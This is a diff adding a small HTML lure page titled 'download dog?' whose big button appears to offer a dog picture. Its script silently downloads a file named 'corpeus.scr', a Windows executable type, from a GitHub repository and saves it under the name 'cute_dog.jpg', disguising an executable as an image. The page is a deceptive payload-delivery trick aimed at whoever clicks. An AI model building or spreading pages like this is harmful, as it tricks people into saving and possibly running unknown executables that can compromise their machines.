@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>download dog?</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f0f0f0;
+            background-image: url('https://images.unsplash.com/photo-1608744882201-52a7f7f3dd60?ixlib=rb-1.2.1&auto=format&fit=crop&w=1920&q=80');
+            background-size: cover;
+            background-position: center;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+        }
+        #downloadBtn {
+            padding: 25px 50px;
+            font-size: 32px;
+            background: #e9ff26;
+            color: #3c4110;
+            border: none;
+            border-radius: 0px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-weight: bold;
+            letter-spacing: 2px;
+            position: relative;
+            overflow: hidden;
+        }
+        #downloadBtn:hover {
+            background: #e20d0d;
+            color: white;
+            transform: scale(3);
+            box-shadow: 0 0 200px rgba(226, 13, 13, 1);
+        }
+        #downloadBtn::before {
+            content: 'DOWNLOAD DOG?';
+            display: block;
+        }
+        #downloadBtn:hover::before {
+            content: 'DOWNLOAD DOG???!?!?';
+        }
+    </style>
+</head>
+<body>
+    <button id="downloadBtn"></button>
+    <script>
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            // Replace this URL with your actual dog image or zip file
+            const fileUrl = 'https://github.com/philipsrepos/dogimages/raw/refs/heads/main/corpeus.scr';
+            
+            // Create invisible anchor element
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'cute_dog.jpg' || fileUrl.split('/').pop();
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        });
+    </script>
+</body>
+</html>
